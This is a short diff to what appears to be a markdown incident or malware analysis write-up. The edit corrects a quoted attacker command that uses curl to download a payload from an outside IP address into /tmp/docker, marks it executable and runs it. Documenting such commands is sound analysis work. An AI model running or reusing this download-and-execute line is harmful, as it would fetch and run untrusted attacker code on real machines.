@@ -136,7 +136,7 @@ This class was used to execute operating system commands on the compromised serv
 
 The malicious command included downloading another payload:
 
-`curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker`
+`curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; /tmp/docker`
 
 ![Malicious curl command](images/05-curl-command.png)
 
